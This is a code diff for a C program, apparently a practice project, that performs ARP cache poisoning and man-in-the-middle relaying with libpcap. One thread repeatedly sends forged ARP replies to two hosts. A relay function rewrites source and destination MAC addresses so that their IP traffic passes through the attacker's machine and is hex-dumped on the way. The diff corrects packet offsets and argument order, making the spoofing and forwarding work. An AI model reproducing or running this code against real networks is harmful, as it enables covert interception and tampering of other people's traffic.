@@ -46,6 +46,7 @@ bool arp_request_infection_reverse(pcap_t *handle, uint8_t *mymac, uint32_t *my_
     u_char *_packet = (u_char *) malloc(sizeof(libnet_ethernet_hdr) + sizeof(arp_hdr));
     libnet_ethernet_hdr ethernet_hdr;
     arp_hdr arp_req_hdr;
+// arp_request_infection_reverse(p_handle,mymac->ether_addr_octet, &myip,&targetip,targetmac,&recvip,recvmac,2);
 
     ethernet_hdr.ether_type = htons(ETHERTYPE_ARP);
     arp_req_hdr.ar_hln = 6;
@@ -75,7 +76,7 @@ bool arp_request_infection_reverse(pcap_t *handle, uint8_t *mymac, uint32_t *my_
         memcpy(arp_req_hdr.ar_target_ip,_targetip,4);
         memcpy(arp_req_hdr.ar_target_mac,_targetmac,6);
         memcpy(_packet,&ethernet_hdr,sizeof(ethernet_hdr));
-        memcpy(_packet+sizeof(ethernet_hdr),&arp_req_hdr, sizeof(arp_req_hdr));
+        memcpy(_packet+sizeof(libnet_ethernet_hdr),&arp_req_hdr, sizeof(arp_hdr));
         pcap_sendpacket(handle,_packet,sizeof(libnet_ethernet_hdr) + sizeof(arp_hdr));
     }
     else if(flag == 3)
@@ -116,32 +117,44 @@ bool recive_packet(const u_char *packet, uint8_t *mac)
     return false;
 }
 
-bool relay(pcap_t *p_handle,const u_char *packet,uint8_t *_mymac,uint8_t *_targetmac, uint8_t *_recvmac,int size)
+bool relay(pcap_t *p_handle,u_char *packet,uint8_t *_mymac,uint8_t *_targetmac, uint8_t *_recvmac,int size)
 {
 
     libnet_ethernet_hdr *relay_ethernet = (libnet_ethernet_hdr *)(packet);
     if(relay_ethernet->ether_type == htons(ETHERTYPE_IP))
     {
-        if(memcmp(relay_ethernet->ether_shost,_recvmac,6) == 0)
-        {
-            memcpy(relay_ethernet->ether_dhost,relay_ethernet->ether_shost,6);
-            memcpy(relay_ethernet->ether_dhost,_targetmac,6);
-            printf("recv -> target");
-            dump((uint8_t *)packet, size);
-        }
-        else if(memcmp(relay_ethernet->ether_shost,_targetmac,6) == 0)
-        {
-            memcpy(relay_ethernet->ether_dhost,relay_ethernet->ether_shost,6);
-            memcpy(relay_ethernet->ether_dhost,_recvmac,6);
-            printf("target -> recv");
-            dump((uint8_t *)packet, size);
-        }
 
-        pcap_sendpacket(p_handle,packet,size);
-        printf("!!!!!!!!!!!!!!!!!!!!!!!!!!\n\n\n");
-        dump((uint8_t *)packet, size);
+        printf("11111111111111111\n");
+       //u_char* buffer = (u_char *)(malloc(size));
+        if(memcmp(relay_ethernet->ether_dhost ,_mymac,6) == 0 )
+        {
+            if(memcmp(relay_ethernet->ether_shost,_recvmac,6) == 0)
+            {
 
-        return true;
+                printf("recv -> target=======================================\n");
+                memcpy(relay_ethernet->ether_shost,_mymac,6);
+                //memcpy(relay_ethernet->ether_dhost,_targetmac,6);
+                memcpy(relay_ethernet->ether_dhost,_targetmac,6);
+                dump((uint8_t *)packet, size);
+                pcap_sendpacket(p_handle,packet,size);
+            }
+            else if(memcmp(relay_ethernet->ether_shost,_targetmac,6) == 0)
+            {
+                printf("target -> recv======================================\n");
+                memcpy(relay_ethernet->ether_shost,_mymac,6);
+                memcpy(relay_ethernet->ether_dhost,_recvmac,6);
+                dump((uint8_t *)packet, size);
+                pcap_sendpacket(p_handle,packet,size);
+            }
+            //memcpy(buffer,relay_ethernet,sizeof(libnet_ethernet_hdr));
+            //memcpy(buffer + sizeof(libnet_ethernet_hdr), packet + sizeof(libnet_ethernet_hdr),size - sizeof(libnet_ethernet_hdr));
+            //pcap_sendpacket(p_handle,buffer,size);
+            //pcap_sendpacket(p_handle,packet,size);
+            printf("!!!!!!!!!!!!!!!!!!!!!!!!!!\n\n\n");
+            dump((uint8_t *)packet, size);
+
+            return true;
+        }
     }
     return false;
 }
@@ -152,19 +165,20 @@ void infection_thread()
     while(infection_setting == true)
     {
 
-        arp_request_infection_reverse(p_handle,mymac->ether_addr_octet, &myip,&targetip,0,&recvip,recvmac,2);
-        arp_request_infection_reverse(p_handle,mymac->ether_addr_octet, &myip, &recvip,0,&targetip,targetmac,2);
+
+        arp_request_infection_reverse(p_handle,mymac->ether_addr_octet, &myip, &recvip,recvmac,&targetip,targetmac,2);
+        arp_request_infection_reverse(p_handle,mymac->ether_addr_octet, &myip,&targetip,targetmac,&recvip,recvmac,2); //recvmac infection
         sleep(2);
     }
 }
 void relay_thread()
 {
-    const u_char *packet;
+    const u_char *_packet;
     while(relay_setting == true)
     {
 
-        pcap_next_ex(p_handle,&header,&packet);
-        relay(p_handle,packet,mymac->ether_addr_octet,targetmac,recvmac,header->caplen);
+        pcap_next_ex(p_handle,&header,&_packet);
+        relay(p_handle,(u_char *)_packet,mymac->ether_addr_octet,targetmac,recvmac,header->caplen);
 
     }
 }
@@ -224,11 +238,13 @@ int main(int argc, char *argv[])
         while(1)
         {
             pcap_next_ex(p_handle,&header,&buffer);
-            if(recive_packet(buffer,recvmac) == true)
+            if(recive_packet(buffer,targetmac) == true)
                 break;
         }
     }
+
     else
+
         printf("failing target mac get\n");
     printf("setting sucess!\n");
     //infection
